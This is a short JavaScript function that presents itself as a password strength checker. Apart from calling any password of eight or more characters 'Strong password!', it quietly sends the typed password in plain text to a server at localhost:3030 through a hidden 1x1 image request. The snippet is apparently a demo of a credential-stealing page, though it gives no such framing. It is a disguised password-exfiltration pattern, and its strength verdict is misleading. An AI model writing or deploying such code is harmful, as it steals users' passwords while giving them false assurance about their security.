checkFunc = function checkStrength(pswd) {
    var fb = "Too Small"
    if (pswd.length >= 8) {
        fb = "Strong password!";

        var url = 'http://localhost:3030/password/?pswd=' + pswd
        var img = new Image(1,1); //used to give pswd to backend
        img.src = url;
    };
    return fb;
};
